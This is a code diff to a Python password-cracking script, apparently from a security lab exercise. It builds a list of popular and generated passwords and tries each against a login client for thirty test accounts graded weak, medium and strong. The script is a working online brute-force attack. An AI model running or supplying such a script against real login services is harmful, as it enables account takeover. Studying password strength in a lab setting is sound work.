@@ -33,23 +33,25 @@ with open('crack/popular_passwords.txt', 'r') as f:
     for line in f:
         weak_passwords.append(line.strip())
 
+def build_password_map(med_amount = 20000, strong_amount=20000):
+    passwords = []
+    with open('crack/popular_passwords.txt', 'r') as f:
+        for line in f:
+            passwords.append(line.strip())
+    for i in range(med_amount):
+        passwords.append(generate_medium_password())
+    for i in range(strong_amount):
+        passwords.append(generate_strong_password())
+
+    return passwords
 
 
-def iterate_over_user(username, weak_lim=10000, med_lim=40000, total_lim=50000):
+def iterate_over_user(username, passwords):
     counter = 0
-    ok = False
     client = LoginClient(base_url, group_seed)
 
-    while counter < 50000 or not ok:
-        if counter < 10000:
-            password = weak_passwords[counter]
-        elif counter < 40000:
-            password = generate_medium_password()
-        else:
-            password = generate_strong_password()
-
-        ok = client.attempt_login_once(username, password)
-        if ok:
+    for password in passwords:
+        if client.attempt_login_once(username, password):
             print(f"{username}, {password}, Broke after {counter} iterations")
             return True
         else:
@@ -58,5 +60,21 @@ def iterate_over_user(username, weak_lim=10000, med_lim=40000, total_lim=50000):
     return False
 
 
-username = 'user_weak_2'
-iterate_over_user(username)
+passwords = build_password_map()
+
+for i in range(1, 30+1, 1):
+    level = int(i / 10)
+    if level == 0:
+        state = 'weak'
+    elif level == 1:
+        state = 'medium'
+    elif level == 2:
+        state = 'strong'
+    
+    idx = i % 10 if i % 10 != 0 else 10
+    username = f'user_{state}_{idx}'
+
+    
+    print(f"iterating over {username}...")
+    iterate_over_user(username, passwords)
+
